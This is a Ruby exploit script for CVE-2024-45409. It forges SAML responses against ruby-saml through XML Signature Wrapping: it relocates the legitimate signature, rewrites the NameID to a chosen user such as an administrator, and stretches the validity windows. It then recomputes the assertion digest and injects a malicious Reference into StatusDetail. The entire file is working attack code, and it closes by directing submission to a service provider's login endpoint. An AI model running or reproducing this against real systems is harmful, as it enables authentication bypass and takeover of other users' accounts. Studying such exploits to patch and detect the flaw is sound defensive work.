#!/usr/bin/env ruby
# Ruby-based CVE-2024-45409 exploit
# Uses Nokogiri for canonicalization to ensure digest compatibility with ruby-saml
#
# This script:
# 1. Takes a legitimate signed SAML Response
# 2. Restructures it for an XML Signature Wrapping attack
# 3. Outputs a forged response that authenticates as the target user

require 'nokogiri'
require 'openssl'
require 'base64'
require 'securerandom'
require 'time'

DSIG = "http://www.w3.org/2000/09/xmldsig#"
SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"

input_file = ARGV[0] || '/app/legitimate_response.xml'
target_name_id = ARGV[1] || 'admin@example.com'
output_file = ARGV[2] || '/app/forged_response.xml'

xml = File.read(input_file)
doc = Nokogiri::XML(xml) { |c| c.strict.nonet }

# Find the existing Signature element
signature = doc.at_xpath('//ds:Signature', 'ds' => DSIG)
abort "No Signature found in input" unless signature

# Get the Reference URI to find the assertion ID
ref_in_sig = signature.at_xpath('.//ds:Reference', 'ds' => DSIG)
ref_uri = ref_in_sig['URI']
assertion_id = ref_uri.sub('#', '')

# Find the assertion
assertion = doc.at_xpath("//saml:Assertion[@ID='#{assertion_id}']", 'saml' => SAML)
unless assertion
  # Try finding any assertion
  assertion = doc.at_xpath('//saml:Assertion', 'saml' => SAML)
  assertion_id = assertion['ID'] if assertion
end
abort "No Assertion found" unless assertion

$stderr.puts "[*] Original assertion ID: #{assertion_id}"
$stderr.puts "[*] Original Reference URI: #{ref_uri}"

# Get digest and canonicalization info from the legitimate signature
digest_method_el = signature.at_xpath('.//ds:DigestMethod', 'ds' => DSIG)
digest_algorithm = digest_method_el['Algorithm']
$stderr.puts "[*] Digest algorithm: #{digest_algorithm}"

transforms = signature.xpath('.//ds:Transform', 'ds' => DSIG)
canon_method = nil
transforms.each do |t|
  alg = t['Algorithm']
  if alg.include?('c14n')
    canon_method = alg
  end
end
$stderr.puts "[*] Canonicalization method: #{canon_method}"

# Step 1: Remove Signature from its current position (Response or Assertion level)
sig_parent = signature.parent
$stderr.puts "[*] Signature parent: #{sig_parent.name}"
signature.remove

# Step 2: Change Response ID (prevent replay detection)
doc.root['ID'] = "_#{SecureRandom.uuid}"
$stderr.puts "[*] New Response ID: #{doc.root['ID']}"

# Step 3: Modify the assertion for the target user
name_id_el = assertion.at_xpath('.//saml:NameID', 'saml' => SAML)
original_name_id = name_id_el.text
name_id_el.content = target_name_id
$stderr.puts "[*] Changed NameID: #{original_name_id} -> #{target_name_id}"

# Step 4: Extend temporal conditions
now = Time.now.utc
future = (now + 86400).strftime('%Y-%m-%dT%H:%M:%SZ')

assertion.xpath('.//saml:SubjectConfirmationData', 'saml' => SAML).each do |el|
  el['NotOnOrAfter'] = future if el['NotOnOrAfter']
end
assertion.xpath('.//saml:Conditions', 'saml' => SAML).each do |el|
  el['NotOnOrAfter'] = future if el['NotOnOrAfter']
  el['NotBefore'] = (now - 3600).strftime('%Y-%m-%dT%H:%M:%SZ') if el['NotBefore']
end
assertion.xpath('.//saml:AuthnStatement', 'saml' => SAML).each do |el|
  el['SessionNotOnOrAfter'] = future if el['SessionNotOnOrAfter']
end
$stderr.puts "[*] Extended temporal conditions to: #{future}"

# Step 5: Insert the Signature into the Assertion (after Issuer)
issuer = assertion.at_xpath('saml:Issuer', 'saml' => SAML)
issuer.add_next_sibling(signature)
$stderr.puts "[*] Moved Signature into Assertion (after Issuer)"

# Step 6: Compute the digest of the MODIFIED assertion as ruby-saml will see it
# ruby-saml removes the Signature (enveloped-signature transform) then canonicalizes
# We need to do the same: temporarily remove the signature, canonicalize, then put it back

signature.remove

# Canonicalize the assertion (without signature) using Nokogiri's exclusive C14N
# This is EXACTLY what ruby-saml does during verification
canon_assertion = assertion.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0)

# Compute digest
digest_class = case digest_algorithm
               when /sha256/ then OpenSSL::Digest::SHA256
               when /sha384/ then OpenSSL::Digest::SHA384
               when /sha512/ then OpenSSL::Digest::SHA512
               else OpenSSL::Digest::SHA1
               end

new_digest = digest_class.digest(canon_assertion)
new_digest_b64 = Base64.strict_encode64(new_digest)
$stderr.puts "[*] New digest value: #{new_digest_b64}"

# Put signature back
issuer.add_next_sibling(signature)

# Step 7: Create the malicious Reference in StatusDetail
# This reference points to the modified assertion with the correct digest
status = doc.at_xpath('//samlp:Status', 'samlp' => SAMLP)
status_code = status.at_xpath('samlp:StatusCode', 'samlp' => SAMLP)

# Build the malicious Reference element
mal_ref_xml = %Q{<samlp:StatusDetail xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><ds:Reference xmlns:ds="http://www.w3.org/2000/09/xmldsig#" URI="##{assertion_id}"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="#{digest_algorithm}"/><ds:DigestValue>#{new_digest_b64}</ds:DigestValue></ds:Reference></samlp:StatusDetail>}

status_detail = Nokogiri::XML::DocumentFragment.parse(mal_ref_xml)
status_code.add_next_sibling(status_detail)
$stderr.puts "[*] Injected malicious Reference in StatusDetail"

# Step 8: Write the forged response
File.write(output_file, doc.to_xml)
$stderr.puts "[*] Forged response written to: #{output_file}"
$stderr.puts "[+] Exploit complete! Submit to SP's ACS endpoint."
